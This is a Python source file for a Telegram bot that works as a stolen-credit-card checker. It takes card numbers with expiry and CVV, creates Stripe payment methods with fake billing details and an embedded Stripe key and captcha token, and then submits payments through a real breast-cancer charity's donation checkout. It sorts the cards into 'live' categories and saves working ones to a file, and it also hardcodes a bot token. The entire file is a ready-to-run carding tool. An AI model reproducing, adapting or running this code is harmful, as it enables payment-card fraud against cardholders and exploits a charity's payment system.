import os
import json
import time
import requests
import asyncio
from datetime import datetime
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import logging
import threading

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token from environment variable (Railway best practice)
TOKEN = os.environ.get("BOT_TOKEN", "8307343077:AAGG7qRYwcN2fJ2Wig3kMpsT7605YEb-pgU")

# Store user states and data
user_sessions = {}
active_checkers = {}

class CardChecker:
    def __init__(self, user_id):
        self.user_id = user_id
        self.running = False
        self.current_card = None
        self.approved_cards = []
        self.total_checked = 0
        self.approved_count = 0
        self.start_time = None
        
    def check_card(self, ccx):
        """Check a single card"""
        if "|" not in ccx or ccx.count("|") < 3:
            return f"❌ Invalid format: {ccx}"
        
        parts = ccx.split("|")
        if len(parts) < 4:
            return f"❌ Invalid format: {ccx}"
            
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf93b5f4-8e77-402a-adb1-f608d324549cd581f0&muid=ef040de5-bf28-4cd2-b356-454489a1509d441557&sid=ce7bdf50-68fd-433c-93f7-436f1eb6e239983d2a&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page=126629&ke_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRlN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakNUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGQ3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdWhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc0S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg4NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvWy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHuGUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'

        try:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
            
            if 'id' not in response.json():
                return f"❌ ERROR CARD: {ccx}"
            else:
                payment_id = response.json()['id']
        except Exception as e:
            return f"❌ Error creating payment method: {str(e)[:50]}"
        
        headers = {
            'authority': 'breastcancerresearch.enthuse.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://breastcancerresearch.enthuse.com',
            'referer': 'https://breastcancerresearch.enthuse.com/cp/5353d/fundraiser?&key=9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'key': '9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
            'paymentMethodId': str(payment_id),
            'threeDSecureSupported': True,
            'stripeConnectedAccountId': 'acct_1LsP7SS6jM7JbDr4',
            'cardCountryCode': 'IT',
        }

        try:
            response = requests.post(
                'https://breastcancerresearch.enthuse.com/checkoutstate/pay/stripe',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            response_text = response.text.lower()
            result = f"💳 {ccx} ➜ "
            
            try:
                response_json = json.loads(response.text)
                
                if ('success' in response_json and response_json['success']) or ('paid' in response_json and response_json['paid']):
                    result += "✅ Card Approved"
                    return result + f"\n📝 Details: Successfully processed"
                
                elif 'error' in response_json or 'errors' in response_json:
                    error_msg = ""
                    if 'error' in response_json:
                        error_msg = str(response_json['error'].get('message', '')).lower()
                    elif 'errors' in response_json:
                        error_msg = str(response_json['errors']).lower()
                    
                    if 'security code is incorrect' in error_msg or 'security code is invalid' in error_msg or 'cvv' in error_msg:
                        result += "✅ CCN LIVE"
                        return result + f"\n📝 Security code incorrect"
                    
                    elif 'insufficient funds' in error_msg or 'insufficient_funds' in error_msg:
                        result += "✅ CVV LIVE"
                        return result + f"\n📝 Insufficient Funds"
                    
                    elif 'avs' in error_msg or 'address_verification' in error_msg or 'incorrect_address' in error_msg:
                        result += "✅ AVS LIVE"
                        return result + f"\n📝 Address Verification Failed"
                    
                    elif '3d' in error_msg or 'three_d_secure' in error_msg or 'authentication_required' in error_msg:
                        result += "✅ 3D SECURE"
                        return result + f"\n📝 Authentication Required"
                    
                    else:
                        result += "❌ DECLINED"
                        return result + f"\n📝 {error_msg[:100]}"
                        
            except:
                if 'security code is incorrect' in response_text or 'security code is invalid' in response_text or 'cvv' in response_text:
                    result += "✅ CCN LIVE"
                    return result + f"\n📝 Security code incorrect"
                elif 'insufficient funds' in response_text or 'insufficient_funds' in response_text:
                    result += "✅ CVV LIVE"
                    return result + f"\n📝 Insufficient Funds"
                elif 'avs' in response_text or 'address_verification' in response_text or 'incorrect_address' in response_text:
                    result += "✅ AVS LIVE"
                    return result + f"\n📝 Address Verification Failed"
                elif '3d' in response_text or 'three_d_secure' in response_text or 'authentication_required' in response_text:
                    result += "✅ 3D SECURE"
                    return result + f"\n📝 Authentication Required"
                else:
                    result += "❌ DECLINED"
                    return result + f"\n📝 {response_text[:100]}"
                    
        except Exception as e:
            return f"❌ Error making payment request: {str(e)[:50]}"
        
        return f"❌ Unknown error for: {ccx}"
    
    def start_checking(self, cards, context):
        """Start checking cards in a separate thread"""
        self.running = True
        self.start_time = datetime.now()
        self.total_checked = 0
        self.approved_count = 0
        self.approved_cards = []
        
        def checking_thread():
            try:
                status_message = None
                
                # Send initial status
                context.bot.send_message(
                    chat_id=self.user_id,
                    text="🔄 Starting card checker...\n⏳ Please wait...",
                    parse_mode=ParseMode.HTML
                )
                
                approved_file = f"approved_{self.user_id}_{int(time.time())}.txt"
                
                for i, card in enumerate(cards):
                    if not self.running:
                        break
                        
                    self.current_card = card
                    self.total_checked += 1
                    
                    # Update status every 5 cards
                    if self.total_checked % 5 == 0:
                        elapsed = datetime.now() - self.start_time
                        status_text = (
                            f"📊 <b>Checker Status</b>\n"
                            f"✅ Approved: {self.approved_count}\n"
                            f"📋 Total Checked: {self.total_checked}\n"
                            f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
                            f"🔄 Checking: {card[:20]}..."
                        )
                        context.bot.send_message(
                            chat_id=self.user_id,
                            text=status_text,
                            parse_mode=ParseMode.HTML
                        )
                    
                    result = self.check_card(card)
                    
                    # Send individual result
                    context.bot.send_message(
                        chat_id=self.user_id,
                        text=result,
                        parse_mode=ParseMode.HTML
                    )
                    
                    # Check if approved
                    if "✅" in result:
                        self.approved_count += 1
                        self.approved_cards.append(f"{card} | {result}")
                        
                        # Save to file
                        with open(approved_file, 'a') as f:
                            f.write(f"{card} | {result}\n")
                    
                    # Delay between checks
                    time.sleep(5)
                
                # Send final results
                elapsed = datetime.now() - self.start_time
                final_message = (
                    f"🏁 <b>Checker Completed!</b>\n\n"
                    f"📊 <b>Results:</b>\n"
                    f"✅ Approved: {self.approved_count}\n"
                    f"❌ Declined: {self.total_checked - self.approved_count}\n"
                    f"📋 Total Checked: {self.total_checked}\n"
                    f"⏰ Time Taken: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n\n"
                )
                
                if self.approved_cards:
                    final_message += f"📁 Approved cards saved to: <code>{approved_file}</code>\n\n"
                    final_message += "<b>Approved Cards:</b>\n"
                    for approved_card in self.approved_cards[-5:]:
                        final_message += f"• {approved_card[:50]}...\n"
                
                context.bot.send_message(
                    chat_id=self.user_id,
                    text=final_message,
                    parse_mode=ParseMode.HTML
                )
                
            except Exception as e:
                context.bot.send_message(
                    chat_id=self.user_id,
                    text=f"❌ Error in checking thread: {str(e)}"
                )
            finally:
                self.running = False
        
        # Start checking in a separate thread
        thread = threading.Thread(target=checking_thread)
        thread.daemon = True
        thread.start()
        
    def stop(self):
        """Stop the checker"""
        self.running = False

def start(update: Update, context: CallbackContext):
    """Send a welcome message when the command /start is issued."""
    user = update.effective_user
    
    welcome_text = f"""
👋 Welcome {user.first_name} to the Card Checker Bot!

🤖 <b>Available Commands:</b>
/start - Show this welcome message
/help - Show help instructions
/check - Check a single card (format: 1234567890123456|12|34|567)
/check_file - Upload a file with multiple cards (one per line)
/status - Show current checker status
/stop - Stop current checking process
/stats - Show your checking statistics

📝 <b>Card Format:</b>
<code>card_number|mm|yy|cvv</code>

⚠️ <b>Note:</b> Use this bot responsibly and legally.
    """
    
    update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML
    )

def help_command(update: Update, context: CallbackContext):
    """Send help message."""
    help_text = """
🆘 <b>Help Guide</b>

<b>How to use:</b>
1. Send single card: /check 1234567890123456|12|34|567
2. Upload file: /check_file and then upload a .txt file
   Each line should contain one card in format: card|mm|yy|cvv

<b>Commands:</b>
• /check [card] - Check single card
• /check_file - Upload file with cards
• /status - Current checker status
• /stop - Stop checking
• /stats - Your statistics

<b>Supported Responses:</b>
✅ Card Approved - Successfully processed
✅ CCN LIVE - Security code incorrect
✅ CVV LIVE - Insufficient funds
✅ AVS LIVE - Address verification failed
✅ 3D SECURE - 3D secure required
❌ DECLINED - Card declined

<b>File Format Example:</b>
<code>
1234567890123456|12|34|567
6543210987654321|01|25|123
9876543210987654|06|28|456
</code>
    """
    
    update.message.reply_text(
        help_text,
        parse_mode=ParseMode.HTML
    )

def check_card(update: Update, context: CallbackContext):
    """Check a single card."""
    user_id = update.effective_user.id
    
    if not context.args:
        update.message.reply_text(
            "❌ Please provide a card in format:\n"
            "<code>/check 1234567890123456|12|34|567</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    card = ' '.join(context.args)
    
    update.message.reply_text(
        f"🔄 Checking card: <code>{card[:20]}...</code>\n"
        "⏳ Please wait...",
        parse_mode=ParseMode.HTML
    )
    
    checker = CardChecker(user_id)
    result = checker.check_card(card)
    
    update.message.reply_text(
        result,
        parse_mode=ParseMode.HTML
    )

def check_file(update: Update, context: CallbackContext):
    """Handle file upload for checking."""
    user_id = update.effective_user.id
    
    if user_id in active_checkers and active_checkers[user_id].running:
        update.message.reply_text(
            "⚠️ You already have an active checker running!\n"
            "Use /stop to stop it first."
        )
        return
    
    update.message.reply_text(
        "📤 Please upload a .txt file with cards.\n"
        "Each line should contain one card in format:\n"
        "<code>card_number|mm|yy|cvv</code>",
        parse_mode=ParseMode.HTML
    )
    
    user_sessions[user_id] = 'waiting_for_file'

def handle_document(update: Update, context: CallbackContext):
    """Handle uploaded document."""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions or user_sessions[user_id] != 'waiting_for_file':
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        update.message.reply_text("❌ Please upload a .txt file!")
        del user_sessions[user_id]
        return
    
    update.message.reply_text("📥 Downloading file...")
    
    # Download the file
    file = document.get_file()
    file_path = f"cards_{user_id}.txt"
    file.download(file_path)
    
    # Read cards from file
    try:
        with open(file_path, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            update.message.reply_text("❌ File is empty!")
            del user_sessions[user_id]
            os.remove(file_path)
            return
        
        update.message.reply_text(
            f"📋 Found {len(cards)} cards in file.\n"
            "🔄 Starting checker...\n"
            "⏳ This may take a while..."
        )
        
        # Create and start checker
        checker = CardChecker(user_id)
        active_checkers[user_id] = checker
        
        # Start checking
        checker.start_checking(cards, context)
        
    except Exception as e:
        update.message.reply_text(f"❌ Error reading file: {str(e)}")
    finally:
        del user_sessions[user_id]
        if os.path.exists(file_path):
            os.remove(file_path)

def status(update: Update, context: CallbackContext):
    """Show current checker status."""
    user_id = update.effective_user.id
    
    if user_id not in active_checkers:
        update.message.reply_text("ℹ️ No active checker running.")
        return
    
    checker = active_checkers[user_id]
    
    if not checker.running:
        update.message.reply_text("ℹ️ Checker is not currently running.")
        return
    
    elapsed = datetime.now() - checker.start_time
    
    status_text = (
        f"📊 <b>Checker Status</b>\n\n"
        f"✅ Approved: {checker.approved_count}\n"
        f"📋 Total Checked: {checker.total_checked}\n"
        f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
    )
    
    if checker.current_card:
        status_text += f"\n🔄 Currently checking:\n<code>{checker.current_card}</code>"
    
    update.message.reply_text(
        status_text,
        parse_mode=ParseMode.HTML
    )

def stop_checker(update: Update, context: CallbackContext):
    """Stop the current checker."""
    user_id = update.effective_user.id
    
    if user_id not in active_checkers:
        update.message.reply_text("ℹ️ No active checker to stop.")
        return
    
    checker = active_checkers[user_id]
    
    if checker.running:
        checker.stop()
        update.message.reply_text(
            f"🛑 Checker stopped!\n\n"
            f"📊 Final Results:\n"
            f"✅ Approved: {checker.approved_count}\n"
            f"📋 Total Checked: {checker.total_checked}"
        )
        del active_checkers[user_id]
    else:
        update.message.reply_text("ℹ️ Checker is not currently running.")

def stats(update: Update, context: CallbackContext):
    """Show user statistics."""
    user_id = update.effective_user.id
    
    if user_id not in active_checkers:
        update.message.reply_text(
            "📊 <b>Statistics</b>\n\n"
            "No checking sessions found yet.\n"
            "Use /check or /check_file to start checking cards.",
            parse_mode=ParseMode.HTML
        )
        return
    
    checker = active_checkers[user_id]
    
    stats_text = (
        f"📊 <b>Your Statistics</b>\n\n"
        f"✅ Total Approved: {checker.approved_count}\n"
        f"📋 Total Checked: {checker.total_checked}\n"
        f"📈 Success Rate: {checker.approved_count/max(checker.total_checked, 1)*100:.1f}%\n"
    )
    
    if checker.approved_cards:
        stats_text += f"\n📁 Last approved file saved\n"
    
    update.message.reply_text(
        stats_text,
        parse_mode=ParseMode.HTML
    )

def error_handler(update: Update, context: CallbackContext):
    """Log errors."""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Start the bot."""
    # Create the Updater
    updater = Updater(TOKEN, use_context=True)
    
    # Get the dispatcher to register handlers
    dp = updater.dispatcher
    
    # Register handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("check", check_card))
    dp.add_handler(CommandHandler("check_file", check_file))
    dp.add_handler(CommandHandler("status", status))
    dp.add_handler(CommandHandler("stop", stop_checker))
    dp.add_handler(CommandHandler("stats", stats))
    dp.add_handler(MessageHandler(Filters.document, handle_document))
    
    # Register error handler
    dp.add_error_handler(error_handler)
    
    # Start the bot
    logger.info("🤖 Bot is starting...")
    
    # Start polling
    updater.start_polling()
    
    # Run the bot until you press Ctrl-C
    updater.idle()

if __name__ == '__main__':
    main()
